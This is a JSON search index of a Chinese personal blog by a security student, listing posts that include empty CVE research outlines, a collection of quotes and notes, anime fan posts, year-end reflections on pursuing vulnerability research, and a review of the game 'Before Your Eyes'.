[{"title":"CVE-2021-44228 漏洞研究","url":"/2025/07/07/CVE-2021-44228-%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/","content":"影响范围\n漏洞分析漏洞利用Exploit 分析漏洞修复ReferenceNVD - CVE-2021-44228CVE - CVE-2021-44228\n","categories":["Vulnerability Investigation"]},{"title":"CVE-2017-0144 漏洞研究","url":"/2025/07/07/CVE-2017-0144-%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/","content":"影响范围\n漏洞分析漏洞利用Exploit 分析漏洞修复ReferenceMicrosoft Security Bulletin MS17-010 - CriticalNVD - CVE-2017-0144CVE - CVE-2017-0144\n","categories":["Vulnerability Investigation"]},{"title":"2024 摘抄汇总","url":"/2024/12/31/Life%20Spark/2024-%E6%91%98%E6%8A%84%E6%B1%87%E6%80%BB/","content":"Use async IO when you need, use multi-threading when you must\n永远不要熄灭心中的火，哪怕别人只看见烟\n理性地做决定，感性地聊天\nHackers should always try to fuck hard\n当读者出于某个抽象层次时，最好能了解当前抽象层次之上和之下地层次。例如，计算机科学家不可能在不理解程序运行平台的体系结构的情况下来充分地优化代码。在不了解晶体管具体用途的情况下，器件工程师也不能在晶体管设计时做出明智的设计选择\n如果你希望我办一件事，你应该把让我办这件事加进你的待办事项里，而不是让我把我做这件事加进我的待办事项里\nLearning Python, made simple\nWe imagine that we present the end of the history. That the future is only going to be more of the same.\n悲观者正确，乐观者前行\n完成比完善重要\n成功是自我预言的实现\nSuccess is like pregnant. Everyone says congratulations, but no one knows how many times you were fucked.\n英国议会的光荣传统，辩论双方不许直接对话，必须对着议长说。这规矩不知道谁想出来的，但的确能避免低级的打嘴仗，也方便议长分配双方发言时间\n贝索斯十几二十年前就说了他的择偶标准：要足智多谋（resourceful）到能把他从一个第三世界国家的监狱里救出去\n想要一口气解决所有问题，是极端革命家的共同点\n大部分人对短期收益要求太高，对长期收益要求太低\n要读书。不是为了变得剥削，而是为了思考\n错误不代表着无意义\n如果一个人把政策评分作为自己的至高追求，那么他就是这个政策的牺牲品\n认知偏误\n\n真实世界中的人会有一些很难避免的认知偏差。这些认知规律可能来自于动物本能或进化遗留的曾经帮助人类渡过难关的思维模式，也可能来源于有倾向性的判断失误，要认识并接纳这样的人性，很多行为是无法用理性解释的\n\n人的本能是认知偏误的重要来源。人会厌恶风险，如果风险从 1% 降到 0% 会比从 5% 降到 2% 给人更大的安全感，人们会为绝对安全付出更大的代价。如果感觉安全或者有人托底，人们又会倾向于冒险，会认为放弃一件事的损失大于得到一件事的收益，即使损失与收益的绝对量是相同的。人们天生有保守化的倾向，一感觉会犯错就会停止尝试，但不作为本身产生的危害可能更大。这一现象可以用来设计实验，例如用抽奖手段就会比处罚手段获得更高参与度。人们天生喜欢熟悉的东西或人，会从众，做比较时会喜欢用熟悉的概念或人群做参考而不是更多的陌生群体。人也是短视的，会看重眼前的事而对长远的事顾不过来，例如学术报告能给人留下印象的往往是最后几张幻灯片或者说峰终效应，毕竟人们更容易记住那些让自己产生情绪波动的事。当你的受众是普通民众时，讲它们熟悉的例子比画饼更能被理解，优势也许熟悉的例子并不能准确地反映你的观点，但传播效果更好。为了减少认知负担，人们倾向于脸谱化一些复杂事物，给这些东西一些抽象的设定或标签，然后对着这些设定或标签发泄情绪。人们喜欢形象化的东西，能画图就不要制表。即使内容不重要，简单重复性的刺激会加深其印象。人们天生搞不清楚概率与随机事件，经常把整体中发生某事的概率理解成个人重复做会发生某事的概率，把现象的概率看成预测性反馈性概率，虽然从回归意义上也有一定合理性，但基本属于一厢情愿。同时，大多数人搞不清观点与事实，例如科研结论通常是事实但经常被解读为一种观点，事实有真假无对错带有不确定性但观点经常带有倾向性与确定性，这对科学传播影响很大\n\n人具备思维惯性。人们会倾向于不计后果维护自己的一致性或之前的判断，哪怕自己已经知道错了，这种思维惯性跟科学思维是反的，科学思维倾向于质疑自己之前的判断。确认偏误也是思维惯性的一种，人们会倾向于主动确认那些自己熟悉或确认过的观点形成正反馈甚至形成光环效应，例如巴纳姆效应。人们会认为好的总会是完美的，甚至会把认可观点或人身上不相关的特性甚至缺点也识别为优点进行追捧。另外，每个人的经历不同或者背景知识不同，会对相同的事实产生不同的决策或判断，也就是说思维惯性对不同的人是不一样的。研究人员不能用自己的思维惯性去设计面向别人的实验，需要更多的同理心来兼容不同想法，写论文的时候也不能假设读者能顺着你思路想问题，毕竟有些人的思路非常跳跃。说白了人会脑补，读下下面这段文字，相信有英文基础的科研人员都知道是怎么回事，但问题是里面的单词大多数都是错的。我们的大脑会把错的识别为正确的，也会同样把正确的识别为错误，一定要警惕过于符合自己价值判断的理论与现象。\n\nI cdnuolt blveiee taht I cluod aulaclty uesdnatnrd waht I was rdanieg. The phaonmneal pweor of the hmuan mnid, aoccdrnig to a rscheearch at Cmabrigde Uinervtisy, it dseno’t mtaetr in waht oerdr the ltteres in a wrod are, the olny iproamtnt tihng is taht th e frsit and lsat ltteer be in the rghit pclae. The rset can be a taotl mses and you can sitll raed it whotuit a pboerlm. Tihs is bcuseae the huamn mnid deos not raed ervey lteter by istlef, but the wrod as a wlohe. Azanmig huh? yaeh and I awlyas tghuhot slpeling was ipmorantt!\n\n人会有逻辑自洽的倾向。这是人维持心态稳定的重要保障，人会倾向于解释一切的模糊因果理论但对概率模型及不确定性敬而远之，也会倾向于从噪声里找规律。好比一个律师打官司，他要做的就是收集事实证据形成证据链，但目的从一开始就定好了，那就是最大程度保护委托人。法庭因果看重的是叙事逻辑而不是真相本身，例如一个人随机杀人，那么其律师就要为这个行为构建行为逻辑，例如精神有问题或被别人指使。不论如何，法官或陪审团会从原因出发来量刑或定罪。然而，事实是这个人可能就是随机杀人，没有精神病史，也没有幕后黑手，但这个事实律师也好、法庭也好都会认为不可能，杀人不是意外，一定有历史或个人因素的原因，而这样的证据也可以很轻松从邻居或朋友评论中找到蛛丝马迹连成故事，可能是小时候踩死蚂蚁后笑了一下，可能是某次闲谈提到了武器，这些都是事实，但连成故事后可能杀人者都会突然发现，原来他逻辑上早就可能杀人了，甚至怀疑自己并不是随机杀人而是早有伏笔。人的记忆需要完整的逻辑连接来补充遗忘的部分，因此说的通的故事就会被认为是真实的。\n\n但逻辑自洽经常跟事实对不上，好比一个科学家研究一个问题，他所能做的就是观察与实验，结论在观察中无法直接得出，要等数据符合统计要求了才能开展分析，经常连结论都没有而只是对之前一个观点的否定，要构建一组因果关系非常麻烦，需要反复多角度论证，如果论述不充分，科学家宁可保持未知状态也不会去任何一个数据支撑不充分的结论。这种因果观先看现象后形成论点，有时候还行不成很严谨的结论。例如病毒出现了，流病专家、基因组学专家还有分析专家都会在各自学科背景下对源头进行推测并报告不确定度，然而持法庭因果的人已经开始了审判。同样，法庭因果下人们只会采纳有利于自己的证据，但科研环境下不存在原告被告，需要同时列出实验阳性与阴性的结果，如果一组实验反复重复时只在小概率下阳性，那么这个现象不能被认为是真的。\n\n认知偏误是所有人都有的问题，了解这些行为除了能帮助识别科研中存在的跟别人有关的问题，也能促进自我反省。通常而言，接受高等教育且从事科研的人经常会把自己的认知水平放到一个高位去跟别人交流，但事实上在犯错这件事上知识水平的预防效果非常有限。科研就是在错误中前进的，越快承认错误就能越快思考发现新的解决思路，当然也许新的思路还是错的。千万不要纠结结论的对错去评判别人，科研的重点在真假而不是对相对临时结论的价值判断。不要傲慢。\n\n\n专业的人喜欢谈差异与术语，解决问题的人更关注问题背后的共性\n邮件回复要快，工作日24小时以内，节假日不发邮件。题目要有辨识度，简明扼要，题目&#x2F;正文要有关键词方便检索。一封邮件讨论一件事，简短，让读者有可操作性，给出决策问句。时间紧急时告诉收信人无回复的结果，有后续追踪。有附件一定在正文中说明。邮件签名提供自己联系方式。尽量用纯文本文件，开拼写检查。明白抄送的人没有回复义务，秘密抄送尽量不要用，注意回复一个人还是所有人。收到回信根据落款选择下一次名字，给陌生人邮件第一句介绍自己，第二句介绍你如何知道对方，不要用带有压迫性的 I wanted 或 I would like，用 I was wondering。可使用列表来分条目讲问题。避免用 please。结尾表示感谢，落款可用 Sincerely，Best wishes，Thanks。\n很深刻。感谢你的这期演讲。我非常喜欢你的“为了洞察力而牺牲了确定性”的说法。做数值的人应该都有一种感觉：任何复杂的事物的解析形式一定是存在于冥冥之中的某个地方的，只是超出了现在人类的认知系统和工具（或者说现代数学）。但是人类依然能够越过这层认知的墙壁发展非解析的科学让现实生活更加美好，而这一切都源于人类智性中可以非解析地认识事物的美妙的洞察力——如果人类的智能来源于一个机械的信号系统，它一定是无法越过这层壁垒的，也永远无法拥有这种优雅的、可以称作智性的基于直觉的美丽性质\n技术可以过时，思想值得传承\n在你刚刚踏上科研道路时，如果你突然想出了一个绝妙的 idea，并且发现它从来都没有其他人做过，那么一般意味着以下三种情况之一：这个 idea 早就有人做过了，但你读文献太少没发现；这个 idea 有致命漏洞，以至于不可行；这个 idea 意义太小，以至于别人发现了但不屑于做。所以当你发现你的 idea 已经被人做过、甚至做过很多的时候，你应该庆新自己走在了正确的方向上，然后在前人工作留下的空白中寻找自己可以做的点\nDo something out of your comfort zone at least once a week\n一项好的研究，一听就是对的，不管是概念上还是技术上，都很详实，很有价值\n同一性越强斗争性越强，因此人们更容易嫉妒和自己类似的人而非远强于自己的人\n缺爱会让一个人变得敏感而极端\n简洁就是美，简洁是提升你对世界洞察力的武器\nWriting reveals holes in your thinking. When your ideas are written and looking back at you, they’re a lot less convincing than when they’re just in your head. Writing forces you to mature your ideas by thinking through counterarguments.\nRob Pike’s 5 Rules of Programming\n\nRule 1. You can’t tell where a program is going to spend its time. Bottlenecks occur in surprising places, so don’t try to second guess and put in a speed hack until you’ve proven that’s where the bottleneck is.\n\nRule 2. Measure. Don’t tune for speed until you’ve measured, and even then don’t unless one part of the code overwhelms the rest.\n\nRule 3. Fancy algorithms are slow when n is small, and n is usually small. Fancy algorithms have big constants. Until you know that n is frequently going to be big, don’t get fancy. (Even if n does get big, use Rule 2 first.)\n\nRule 4. Fancy algorithms are buggier than simple ones, and they’re much harder to implement. Use simple algorithms as well as simple data structures.\n\nRule 5. Data dominates. If you’ve chosen the right data structures and organized things well, the algorithms will almost always be self-evident. Data structures, not algorithms, are central to programming.\n\n\nPike’s rules 1 and 2 restate Tony Hoare’s famous maxim “Premature optimization is the root of all evil.” Ken Thompson rephrased Pike’s rules 3 and 4 as “When in doubt, use brute force.”. Rules 3 and 4 are instances of the design philosophy KISS. Rule 5 was previously stated by Fred Brooks in The Mythical Man-Month. Rule 5 is often shortened to “write stupid code that uses smart objects”.\n只有傻瓜才会期待他的同胞们的理性行为\n哲学让我们对熟知的事物感到陌生\n历史就是无情者对无脑者的征服\n中国父母是含蓄内敛的，别问它们要不要，直接买\n","categories":["Life Spark"]},{"title":"2024 年惠生贺","url":"/2024/09/23/Life%20Spark/2024%E5%B9%B4%E6%83%A0%E7%94%9F%E8%B4%BA/","content":"一转眼已经六年了，又重温了一遍剧场版，原作和广播剧，无论看多少次都是那么地感动，我永远喜欢路人女主的养成方法（冴えない彼女の育てかた）！！！惠生日快乐😭😭😭めぐみ，お誕生日おめでとう！Megumi, Happy Birthday!\n","categories":["Life Spark"]},{"title":"MyGo 也要 Go!2023 年度总结","url":"/2024/01/01/Life%20Spark/2023%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/","content":"我的2023年可以用MyGo里灯的一句台词概括道に迷って前に進む！\n\n\n今年有些MyGo读了读自己写的周报，2023年还是干了不少事，编写又最终关掉了TomBot，建了7erry.com这一网站甚至进行了备案，CTF的从0到1，技术栈得到了比较多的拓展，兴趣爱好也新开了不少新坑，甚至和好友们去看了流星雨，二刺螈浓度增加，成分越来越杂，尤其是BangDream!It’s MyGo!!!!!，为我带来了充满了至尊版的享受的长达三个月的快乐，这样的由各种偶然因素共同缔造的一次追番奇迹恐怕是我的人生中十年难遇一次的快乐旅途。但与此同时，我又很难不感慨自己的精力有限或行动力还有较大的提升空间。ToDo List里大量的未完成清单项，这一年中更是时有反省，思考自己初心的夜晚，总觉得自己想要做到的东西太多，而总是才华跟不上野心，心态浮躁而无法淡泊明志，宁静致远。我常常突然停下脚步，因为缺乏方向与动力而不知所措，在眼睛的一睁一闭之间，时间就这样飞速地流逝了。直到近几天，看到各大APP陆续发给我年终报告的时候，意识到感觉太多事都还没来得去做而2023年却马上要结束的时候，那种失落于时间的流逝的伤感一直萦绕着我，直到今天。\n我在中学时期就为自己订了不少的人生目标，以为清楚自己接下来的人生规划，想要过上什么样的生活，希望创造出什么价值，将会有怎样的追求。但当我来到大学，就读相关专业并开始了网络安全相关技术的学习，真正踏上追求梦想的道路时，我却有些惘然了。一方面是大环境确实不是很乐观，而安全行业又比较重量级，心理上难免会有些压力，另一方面大学中也确实有着很多的机遇与挑战，让人目不暇接。当看到别人五彩缤纷的大学生活时，偶尔也会有些令人落寞，当看到其他同样优秀的人取得的优秀成绩时，又很难不为平庸的自己感到焦虑甚至内耗。卷，卷不明白，摆，摆不彻底，我也不是一个甘于躺平生活的人。最后，也正如之前所提到的，我育很多想做的事，但我的精力与行动力又不足以支撑起我以一个比较高的效率去解决它们。大学生活的节奏越来越快，不再有以前那样充足的发呆的时间，加上高强度的网络冲浪带来的信息冲击，总觉得自己正在变得没有主见，越来越缺乏自己的思考。随着生活中形形色色的的茫然的出现与积累，我不由得有了一种自己有些迷了路的感觉，并开始纠结自己所作的事情的意义，越来越患得患失或有些摆烂地完全由着自己的性子来做很多事。\n当2023年结束，我开始回望并反思这一年的表现的时候，我又重新看了一遍MyGo这部动画，当我看到Tomori在舞台的MC环节大声地喊出道に迷って前に進む！，我突然开始能够逐渐这些伴随着我的感觉和解了。就像你有时会发现自己以前无心中学到的知识也会在将来的某一天派上了用场一样，我意识到，像这样感到迷茫的经历也在塑造并启发自己。在如此黄金年龄，在还有试错的机会的时候，去做出各种各样的尝试本身未尝不会成为一种独特的，能够化为成长的养料的经历。虽说是迷路了，但只要还在前进，我想应该就不会有问题。我相信在这样一次又一次的，循环往复但又递进深入的思考与挣扎中，我能够越来越能接近自己寻求的答案。就像我如今能更有把握地说:”我是真的很喜欢自己过去至今所热爱的事物啊!”这样。\nReference\n","categories":["Life Spark"]},{"title":"Megumi","url":"/2023/09/23/Life%20Spark/Megumi/","content":"你好，今天是9月23日，是加藤惠 Kato Megumi 的生日惠生日快乐😭😭😭\n\n\n","categories":["Life Spark"]},{"title":"2024 年终总结","url":"/2024/12/27/Life%20Spark/2024-%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/","content":"在去年的年终总结中，我借用了 MyGO 主唱高松灯的台词， 道に迷って前に進む！ 概括了自己的 2023 年。令人感慨的是，我在 2024.12.27 便开始写年终总结，却不知如何下笔，以至于写到 2025.1.28 也没能写完，并且就这样拖沓了 3 个月。在第一时间收看了最终话并目睹 1 月新番 Ave Mujica 于 2025.3.27 周四晚上完结的那一刻，我却突然文思泉涌，并决定以 Ave Mujica Episode 各话的标题概括自己的 2024，甚至是 2025 年\n\n\nQuid faciam?2023 年的我认为自己是 MyGO 的，其原因在于：成为一名渗透测试工程师是我自中学以来的理想，但随着技术水平的提升与对行业了解的深入，我逐渐对自己的理想产生了一定的质疑。这种质疑并不是因为价值的条件化而产生的，我是兴趣驱动型的人，很少把自己的价值建立在他人的认同上，相反，这种质疑的产生来自于我自我实现需求层次的上升。\n我意识到，大部分工作岗位，例如渗透测试或其他安全相关的业务岗，本质上都是在通过重复的机械劳动创造价值。做业务无异于赛博搬砖。这些劳动当然是至关重要的，并且是人类社会存续和发展的基石。但当我去参加了一些护网行动，去投身于这些劳动中，并意识到按照自己的人生规划接下来的大半辈子都需要花在这些重复劳动上时，我动摇了，于是 MyGO 了。\n每逢生日，新年或某些重要时刻，在回望过去或做出某种关键决定时，我总是从这样一个经典的哲学问题开始思考：接下来，我要到哪里去？\n当我未曾参与到网安工作中时，从事这一工作是我的最大追求，或者说以自己热爱的技术谋生是我的理想。而当我真正参与到这些工作当中的时候，我却不再仅仅满足于此。我希望自己的工作能够创造价值。当然这些劳动也创造着价值，而且是必不可少的价值。我相信劳动者们在法律与人格上是平等的，但劳动不会是平等的，劳动所创造的价值从来都不是均等的，我希望进行高价值的劳动，我希望去做那些能为整个行业的发展带来帮助的工作，我希望去为人类的发展做出自己原创性的贡献。我当然也乐于以类似匠人精神的方式去精进自己的技术，去尝试提高自己完成这些基本劳动的能力。但如果一个人的目标是建设一座大厦，那他不应该在如何雕刻一块砖瓦上耗费太多精力。\n当然，建设一座大厦必然远比雕刻一块砖瓦要困难，也绝非一人之力能够实现。将自己置于这种宏大叙事之下未必能比从具体的事开始做起更有可能成功。但即使如此，我也依旧想要去从事那些我认为大有可为的工作，去和那些充满热情的人做出在社会上有影响力甚至能对人类历史的发展有所推动的成果。\n\n“我”这一个体的最终诉求是什么？我要如何实现自己的人生价值？我觉得自己很幸运，我所热爱的既为我所擅长，又为世界所需要，还能作为自己谋生的手段。我感到迷茫和动摇时曾对它视而不见，我感到不安和沮丧时曾对它不置可否。但只要我清醒过来向四周望去，就会发现，我要去的那颗星星始终就在那里。\n我花了 23 年和 24 年上半年总计一年半的时间确定了自己的想法并得出了结论————我喜欢计算机安全技术，我决定以计算机安全漏洞的研究为方向攻读博士学位，我要做难而正确的事。\nFacta fugis, facienda petis我以前对从事科研工作有不小的负面印象，这些负面印象的主要成因是：\n\ncoding 在一些科研工作者眼里是 dirty work。我不认为一个 coding 水平低下还不了解实用的工程技术的脱产科研人员能够开展有价值的研究。\n学术圈的学阀现象与人情世故让我觉得本应专注于追求真理与光明的科研变得功利而不纯粹。\n读研因内卷成为了大多数本科生的默认选择。这些象牙塔里的学生从不怀疑这一选择是否适合自己，便本能地选择了最熟悉的应试教育考研保研的道路。我反感这种 nerd 式的人生态度与选择。\n(起码在国内) Paper 成为了衡量科研人员科研产出主要甚至唯一的指标，大量的科研工作者自嘲为优秀的论文作家而非科学家。而我坚信，如果一个人把某种建制内的价值评判标准当作了自己人生的最高追求，那他就是这种建制下的牺牲品。\n\n大一时的我因此对所谓的科研一直都抱有着较强的抵触情绪，也从未想过会有一天萌生出攻读博士的念头。但随着对世事认知的加深，我逐渐放下了以前那些非黑即白的成见，理解了现象之下的底层逻辑与条条框框背后的取舍妥协，选择了与它们和解。促使我和解的另外一个重要原因是，当我开始接受科研训练，了解了前人的工作和研究后，这些先驱们的才华，理念和思想深深地打动了我。我被他们所吸引，想要像他们一样开展有价值的研究，并希望成为像他们一样的人。\n但说句实话，攻读博士学位只会是一个起点，它是一张入场券。即便是正在进行总结的此时此刻，我也还不清楚自己日后究竟会去工业界还是学术界。但无论将来会选择哪条道路，我想要踏上的起点都是确定的。\nFluctuat nec mergitur在 24 年中立下这个目标后，剩下的时间便都花在了我为了达到这一目的而去做出的一系列努力上。包括但不限于参加学科竞赛，陶瓷，细化研究方向，接受科研训练。其中属实是绕了不少弯路，不过最终也能算是勉强走上了正轨。以及还有一件不得不说的，有些冒险的决定————出国。\n国外的学术研究氛围和资源要比国内好上不少，上海交通大学学生自救手册甚至强调如果一名学生想要投身到科研当中并攻读博士学位，就应该极力反对它留在国内，而鼓励它前往国外的名校进行深造。事实上我也是这么想的，其结果是我将自己的很大一部分 PhD 申请希望都压在了英国的布里斯托大学上。布里斯托大学（Universal of Bristol，UoB）与华科，武大，北理，西交等高校开展了一个 3+1 本硕连读项目，合作院校的学生如果大三便修读完了毕业所需要的学分，可以通过报名该项目于大四学年直接攻读 UoB 的硕士学位。我在 2022 年就注意到了它，并在 24 年和亲友讨论了之后确定了报名，并顺利地得到了 offer。\n事实上华科的学生以我的目前的成绩完全可以申请到一些排名更高的大学，但事实上 UoB 是我结合各个方面的因素后最终锁定下来的目前来看最具性价比和成功率的选择。这些因素包括但不限于\n\nAMD 3+1 能让我大四时本科和硕士一起毕业，省下一年时间\nATAS 认证时由于硕士还没拿到学位可以作为本科生填申请材料\nUoB 和华科都会为该项目提供一定的资金补助\nUoB 作为理工科强校在作为文科与商科留学热门国家的知名度不是那么高，有低调留学的好处\nUoB 与 CSC 的合作名额相较其他学校而言较多（60 个）而该校中国留学生相对较少，竞争不是那么激烈\nUoB 有着两位和我的研究方向颇为匹配的导师\n本校硕申本校博更有优势，同时因为 ATAS 认证与自身专业的敏感性可能需要读一个英硕提高成功率\nUoB 是一所好大学\n我的专业是国家的重点发展方向之一，高概率能得到 CSC 奖学金\n\n拿到 UoB 的 offer，参加学科竞赛，进组，接受科研训练，写代码，漏洞研究，当然还有上课和考试。就这样，我的 2024 结束了。\nPer Aspera Ad Astra在 BangDream! Ave Mujica 开播前，几乎没有人能想到它会烂成这样。作为一名忠实的原创动画观众与前作 MyGO 的粉丝，在这惊心动魄的三个月里，我也不乏狂喜与破防的时刻，甚至一度后悔自己为什么要往它身上投入这么多感情与期待。在它完结的那一刻，我扪心自问，如果 2023 年的那个 7 月我便能知道 MyGO 的追番奇迹后是 Mujica 的烂尾和巨大伤害，我还会踏上这趟如梦似幻的追番之旅吗？\n我的 PhD 申请之旅能够一帆风顺吗，能够拿到 offer 吗，能够通过 ATAS 审查吗，能够拿到 CSC 资助吗，这趟追梦之旅的终点会是什么呢？要是套瓷老师这一步就失败了该怎么办，要是 CSC 校内提名就角逐失败了怎么办，要是拿到了 offer 却没通过 ATAS 审查怎么办，要是没能拿到 CSC 资助怎么办？如果我最终失败了，我还会接着踏上追求理想的旅途吗？\n我一定会。无论如何，我都会登上这无法预测的命运之舞台。因为我知道\nPer Aspera Ad Astra\nReference蒋炎岩｜科研劝退信蒋炎岩｜读博那些事儿现代科研指北\n","categories":["Life Spark"]},{"title":"BanGDream!It's MyGo!!!!!","url":"/2023/09/15/Life%20Spark/MyGo/","content":"2023年的一月，异世界厕纸扎堆，没有想看的，枯燥度日2023年四月，赛马娘·巅峰之路问世，短段四集剧情跌宕起伏，作画张力十足，好看，但只有四集，不大过瘾与此同时，去年最后一集剧情正要怒涛式展开的水星的魔女烂尾，制作组互相甩锅，再无乐子，高达新增耻辱柱，最后竟全靠跃动青春支撑起了看番体验，美智留的阳光与热情是如此温暖。2023年七月，最想看的死神·诀别谭篇剧情过渡期，几乎没有作画会或特别爆的一集，还得再等。僵尸百分百原作背刺动画，咒术回战老是停播，原创类别动画更是只有三部，虽有雾山五行强势更新，但也只有四集，不死少女杀人笑剧观看体验一流但想多攒几集一口气看。想找周指活，却没有目标\n幸好,BanGDreamMgGo!!!!!降临了\n\n\n就像是人们会称呼2022年是有孤独摇滚的那一年，或者称2022年是有赛博朋克边缘行者的那一年一样，以后，长颈鹿们会说2023年是素世加冕的那一年，是有MyGo!!!!!的一年\n\n谁能想到，一部几乎没有宣发，声优有些棒读，手游宣传片的3D偶像动画凭借连续放出三集，其中还有一集神回，直接凭借初期就展露出的独特气质，巧妙的剧情节奏的把控，令人叹服的情感氛围渲染，讨喜的人设，让自诩白河豚猎人的我也直呼内行的重女扭曲剧情直接让人沉沦。随着剧集不断地放出，剧情一波一波的高潮的到来，动画受众的新粉丝与相关情节爱好者的核心粉丝自发形成的极好讨论氛围与绝活好活频出的二创环境迅速征服了大量观众。\n\n看完MyGo第7集，这下矛盾到达巅峰了，该解决了吧看完MyGo第8集，这下矛盾到达巅峰了，该解决了吧看完MyGo第9集，这下矛盾到达巅峰了，该解决了吧看完MyGo第10集，卧榻麻爆了，爽飞\n\n在它的连载期间，我见证了素世惊世一跪彻底引爆戏里戏外的所有人，见证了Live回的所有观众的开香槟现场，见证了挺好萌的开始与素世的加冕，见证了祥睦姐妹说等神贴的诞生，见证了三支乐队的破而后立。这是我入宅9年以来经历的最快乐的一次狂欢\n\n长崎素世不需要挺王身份来抬高自己，但挺好萌需要为她加冕才能证明自己的含金量\n\n\n2023年二次元的阴霾已经彻底被MuGo扫清，但此刻的我回首，MyGo!!!!!的故事却画上了休止符MyGo的十三集播出后，我已是世界上最寂寞最空虚的人我将停止呼吸到BangDreamAveMujica第一集播出为止大家再见:P\n\n","categories":["Life Spark"]},{"title":"Python,启动！","url":"/2023/08/12/Life%20Spark/Python-%E5%90%AF%E5%8A%A8%EF%BC%81/","content":"\n\n\n\n写Python玉玉了孩子不懂事视频做着玩的\n","categories":["Life Spark"]},{"title":"历历在目——本杰明·布莱恩了不起的一生","url":"/2023/09/30/Life%20Spark/%E5%8E%86%E5%8E%86%E5%9C%A8%E7%9B%AE/","content":"历历在目是一款点子游戏，它会调用你的摄像头，通过你是否眨眼来进行游戏内的交互行为。画面不可不谓是简陋，主要角色与场景建模都是棱角分明的多边形，游戏性极为薄弱，你所能做的所有事就是用鼠标移动视角，以及眨眼进行交互。它的流程极短，通关这款游戏只用了我112分钟。它以这些简易的武器，击垮了我的心理防线。它就是我心中独立游戏应有的模样。\n\n\n本博客含有严重剧透，游戏流程很短建议先去体验一遍游戏商店页面地址\n\n绝佳的设计理念在人的一生中，大约2~6秒（平均数据统计为5秒）就会眨眼一次，每次眨眼需要花费0.2~0.4秒钟的时间，一天大约眨眼11500次，一年总计眨眼四百多万次。你的一生大概能眨三亿眼，又或者说你的人生会按下三亿次快门。同时，眨眼也是你的生物本能，你不得不眨眼。游戏中的交互是这样实现的，当你在一个场景待了一定时间后，节拍器会响起，一旦你眨了眼又或者摄像头没有捕捉到你的眼睛，无论当前场景的人物对话是否说完，可交互元素是否全部交互，游戏会直接进入到下一个场景。而下一个场景的故事可能发生在上一个场景的故事的五秒钟后，也可能发生在上一个场景的故事后的五年以后。你无法抗拒眨眼的本能，因此你也无法抗拒游戏中时间的流逝。这给玩家带来的情感体验是冲击性的，例如你正在经历一个非常美好或者非常悲痛的场景，可能你只是无意之间眨了眨眼睛，这段本该多么深刻的记忆便可能连三秒都维持不了便已经消失，可能你极力睁大着眼睛，但无论你有多么不舍得，最终都会极度无力地迎来下一个场景。正如游戏名历历在目(Before your eyes)所试图表达的那样，往事历历在目，可人生只在眨眼间\n优秀的音乐与画面氛围水墨扩散般的游戏场景切换，水彩画般平和美好的画面氛围与整体偏暖的色调。尽管它的画面规格是简陋的，但游戏最终呈现出来的效果却是高画面规格作品也未必能做到的。再加上全程在线的与故事剧情密切联系的音乐，故事的起承转合效果都非常地棒\n短小而动人的游戏剧情我破防了。\n游戏前四分之三的篇幅向你展示了一个足够令人感慨的人生故事，你小时候是音乐神童，曾是作曲家却放弃了的母亲在你身上看到了希望，既温柔又严厉的母亲时刻启发着你去探索音乐，当她对你做出了太多的限制，例如你被剥夺了与邻居家小女孩一同玩乐的时间。但幽默而又可靠的父亲会站在你这一边，他深爱着母亲也深爱着你。哪怕母亲对猫过敏，也依然愿意为了不让你和心爱的，父亲捡回来的小猫分开而忍受。\n\n在母亲带你去钢琴学校报名，并需要在一段时间后表演校方要求的曲子作为考核前，你和邻居家的小女孩在晚上偷偷溜了出去，你们睡在沙滩上，望着星星和彼此互诉衷肠。不过由于你熬了一宿，第二天的考核你搞砸了。母亲每次带你去那所学校要开一个小时的车，但回去的路上她并没有责怪你，只是希望你能过好自己的一生。在你十一岁那年，你病倒了，你卧病在床，停止上学了一年。但在此期间你爱上了画画，你长大了一些后去了一所艺术学校，学校的教授发现了你在艺术上的天赋，你最终成为了一位国际文明的画家，尽管在此期间你曾因为自己艺术上的坚持拒绝了与知名企业的合作而有些穷困。然而母亲突然因病去世，这对你和你的父亲造成了沉重的打击，你从此销声匿迹，面对着老师的失望与母亲生前的画像，你不断地回忆着与母亲之间地回忆，你画出了母亲。这幅画更加成就了你，父亲因为睹物思人决定卖掉载满回忆的房子，在整理母亲遗物时你发现了母亲生前作的曲，你公布了她们，母亲在去世后成为了举世闻名的作曲家。你复出几年后的一场展览上，你与长大后的年幼时邻家的小女孩重逢，你们度过了余生。然而，此时在之前剧情中埋下的伏笔被揭开，故事迎来了一个惊人的反转。你并未成为一位优秀的钢琴家，你也从未成为一位画家。你甚至还没有长大，在你十一岁那年你得的病非常重，母亲崩溃了，泣不成声。但即使如此，父亲母亲也不肯放弃希望，始终鼓舞着你，并希望你保持乐观。之前与你关系亲密的邻家女孩，又或者说，你的初恋打电话问你你怎么了，你只字不提自己的病，哪怕她在学校打听问你是不是病了你也矢口否认，因为你不想让她见到你现在的样子。她非常，非常生气甚至有些口出恶言地挂断了电话。你的病情逐渐加重，甚至屡屡昏迷，时不时会到医院抢救。母亲为了鼓舞你给了你一台外公给母亲，母亲曾用来作曲的打字机，你可以用打字机写下自己病好后想做的事，你写下了游戏之前发生的剧情作为自己假想的将来的人生的故事。你又昏迷了，醒来后发现你的初恋女孩正坐在你床前，原来母亲意识到了不对并联系了她。你给她看了你自己写的故事，她念了出来，她发现你把她称呼为自己的初恋，不禁笑骂了你几句。她走后，母亲找上你，原来母亲偷听了你们的对话，她想看看你写的故事。母亲拿着你写的故事走开了，随后泣不成声，最后父亲走了过来，夸赞你的文笔就行狄更斯一样好，他永远以你为骄傲。但其实在深夜里，你总是不禁写下，本杰明布莱恩是这个家里的废物，他甚至做不到积极对抗自己的病情。再一次昏迷，再一次醒来，你心爱的女孩又坐在了你的床前，你的眼前又浮现起了那一晚和她一起看的星星，她为上次取笑你抱歉并告诉你她并不害怕见到这样的你，因为与你相遇的一年前她的母亲去世了，也是这样的情形，是你让她走了出来，最后她叫你闭上眼睛，留给了你一张字条后离开了，你打开了字条，上面只有一句话和她的落款，”你是我的初恋”。没过几天，药物已经几乎不起作用，终于，在母亲撕心裂肺的哭喊与父亲的安慰声中，你丧失了意识。在你的最后一次回光返照期间，你的母亲啜泣着告诉你，你写的故事真的很有想象力，你写的那个人是那么有趣，情感那么强烈，但她不是很喜欢他，因此她也写了一个故事并为你念了出来，故事的名字叫做，本杰明·布莱恩了不起的一生:\n\n本杰明布莱恩生于一个普通的家庭，父母都是普通人，居住在海边小镇。他的母亲是一位作曲家。或者，至少她曾梦想成为